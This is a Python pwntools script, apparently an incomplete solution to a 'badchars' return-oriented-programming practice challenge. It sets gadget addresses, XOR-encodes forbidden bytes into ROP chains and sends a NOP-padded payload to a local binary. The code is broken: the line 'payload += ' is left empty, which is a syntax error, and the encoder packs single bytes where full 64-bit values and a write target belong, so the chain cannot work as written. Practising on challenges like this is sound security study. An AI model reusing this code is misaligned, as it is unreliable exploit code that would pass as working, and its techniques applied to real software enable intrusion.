#!/usr/bin/env python3
from pwn import *
import sys

nop = b"\x90"
null = b"\x00"

bytekey = b"\x0A" 
intkey = 0x0A

badchars = bytearray(b"\x78\x67\x61\x2e")

pop_r14_r15 = p64(0x00000000004006a0)
xor_r15_r14 = p64(0x0000000000400628)


def PrintBytes(label: str, buffer: bytes):
	print(label)
	print(''.join('\\x{:02x}'.format(x) for x in buffer))


def CheckBadByte(c: chr) -> bool:
	for i in range(len(badchars)):
		if c == badchars[i]:
			return True
	return False


def XorCipher(c: chr) -> bytes:
	global intkey

	p = c
	p ^= intkey
	if CheckBadByte(p):
		print(" ! bad bytes detected in encoded payload. Get wrecked")
		exit(1)

	return p.to_bytes(1, 'little')

def Generate(buffer: bytes) -> bytes:
	global intkey

	array = bytearray()
	for i in range(len(buffer)):
		c = buffer[i]

		if CheckBadByte(c):
			packer = pop_r14_r15 + bytekey + XorCipher(c) + xor_r15_r14
			array.extend(packer)
		else:
			array.extend(c.to_bytes(1, 'little'))
	return array


if __name__ == "__main__":

	p = process("badchars")
	context.update(arch="amd64", os="linux")

	if len(sys.argv) > 1:
		if sys.argv[1] == "gdb":
			gdb.attach(p)
		else:
			print(" ! unkown option {}".format(sys.argv[1]))
			exit(1)

	length = 0x2
	payload = nop * (length + 8)
	payload += 

	final = Generate(payload)

	p.send(final)
	print(p.recvall())

